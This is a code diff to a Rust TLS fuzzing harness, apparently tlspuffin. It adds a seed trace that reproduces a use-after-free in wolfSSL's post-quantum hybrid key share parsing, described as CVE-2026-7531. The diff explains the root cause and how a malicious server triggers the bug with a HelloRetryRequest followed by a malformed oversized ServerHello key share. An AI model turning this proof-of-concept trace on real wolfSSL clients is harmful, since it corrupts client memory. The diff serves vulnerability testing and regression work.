@@ -42,6 +42,9 @@ pub fn create_corpus(
 
         // Downgrade attack: the client offers both TLS 1.2 and TLS 1.3 (`TLSVersion::Both`).
         seed_cve_2024_5814: put.supports("tls12") && put.supports("tls13"),
+
+        // HelloRetryRequest towards a PQC hybrid group: the client must offer the hybrid groups.
+        seed_cve_2026_7531: put.supports("tls13") && put.supports("pqc_hybrid_groups"),
     )
 }
 
@@ -1545,6 +1548,107 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
     }
 }
 
+
+/// <https://nvd.nist.gov/vuln/detail/CVE-2026-7531>
+///
+/// Use-after-free / double-free of the client's ECDH private key in the PQC hybrid key share
+/// handling of wolfSSL 5.8.0 to 5.9.1 (incomplete fix of CVE-2026-5460, fixed in 5.9.2 by
+/// <https://github.com/wolfSSL/wolfssl/pull/10327>).
+///
+/// Root cause: `TLSX_KeyShare_ProcessPqcHybridClient` aliases the hybrid entry's ECDH private key
+/// into a temporary entry (`ecc_kse->key = keyShareEntry->key`) and calls
+/// `TLSX_KeyShare_ProcessEcc_ex`, which always frees that key and NULLs `ecc_kse->key`, even when
+/// importing the server's point fails. The pointer is copied back to `keyShareEntry->key` only on
+/// success, so on error the hybrid entry keeps a dangling pointer, which `TLSX_KeyShare_FreeAll`
+/// passes to `wc_ecc_free` and `XFREE` when the `WOLFSSL` object is freed (CWE-416).
+///
+/// Reachability: wire-reachable by a malicious TLS 1.3 server, but only when wolfSSL is built
+/// with ML-KEM (`--enable-mlkem`, off by default; see the `pqc_hybrid_groups` capability). With
+/// the default configuration, the client offers the hybrid groups in `supported_groups` but only
+/// sends a P-256 key share, so the attacker:
+/// 1. answers the first ClientHello with a HelloRetryRequest selecting `SecP256r1MLKEM768`,
+///    making the client generate a hybrid (P-256 + ML-KEM-768) key share in its second
+///    ClientHello;
+/// 2. sends a ServerHello whose `SecP256r1MLKEM768` key share is longer than the 1088-byte
+///    ML-KEM-768 ciphertext, but whose leading ECDH part (`keLen - 1088` bytes) is not a valid
+///    P-256 point. Almost any byte string longer than 1088 bytes does; the seed reuses the
+///    1191-byte DER RSA key `fn_alice_key` (ECDH part: 103 bytes starting with 0x30), already
+///    part of the Mapper and of the TLS 1.3 server-attacker seeds.
+///
+/// The bug fires while parsing the ServerHello, before any key derivation, so no ML-KEM crypto
+/// is needed on the attacker side. ASan reports the use-after-free when the client is freed.
+///
+/// The same input also triggers CVE-2026-5460 (the ML-KEM private key is freed on the same error
+/// path and later `ForceZero`ed), which ASan reports first. To observe CVE-2026-7531 itself
+/// (`wc_ecc_free` on the freed ECDH key), the PUT must have CVE-2026-5460 fixed, as in the
+/// `wolfssl584-asan-mlkem` preset.
+pub fn seed_cve_2026_7531(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let server_hrr = term! {
+        fn_hello_retry_request(
+            fn_protocol_version12,
+            fn_hello_retry_request_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compressions,
+            (fn_hello_retry_extensions_make(
+                (fn_hello_retry_extensions_append(
+                    (fn_hello_retry_extensions_append(
+                        fn_hello_retry_extensions_new,
+                        fn_supported_versions13_hello_retry_extension
+                    )),
+                    // ask the client for a SecP256r1MLKEM768 key share
+                    (fn_key_share_hello_retry_extension(fn_named_group_secp256r1mlkem768))
+                ))
+            ))
+        )
+    };
+
+    let server_hello = term! {
+        fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 1)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compression,
+            (fn_server_extensions_make(
+                (fn_server_extensions_append(
+                    (fn_server_extensions_append(
+                        fn_server_extensions_new,
+                        (fn_key_share_server_extension(
+                            (fn_key_share_extension(
+                                fn_named_group_secp256r1mlkem768,
+                                // > 1088 bytes whose leading ECDH part is not a P-256 point
+                                (fn_payload_u16(fn_alice_key))
+                            ))
+                        ))
+                    )),
+                    fn_supported_versions13_server_extension
+                ))
+            ))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![TLSDescriptorConfig::new_client(client, TLSVersion::V1_3)],
+        steps: vec![
+            // ClientHello 1, Client -> Server
+            OutputAction::new_step(client),
+            // HelloRetryRequest, Server -> Client (the client answers with ClientHello 2)
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hrr }),
+            },
+            // ServerHello with the malformed hybrid key share, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
@@ -1566,6 +1670,7 @@ pub mod tests {
             seed_freak.build_named_trace(),
             seed_cve_2022_25640_simple.build_named_trace(),
             seed_cve_2022_38153.build_named_trace(),
+            seed_cve_2026_7531.build_named_trace(),
             // TODO: 685 seed_cve_2022_39173.build_named_trace(),
             // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
             // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
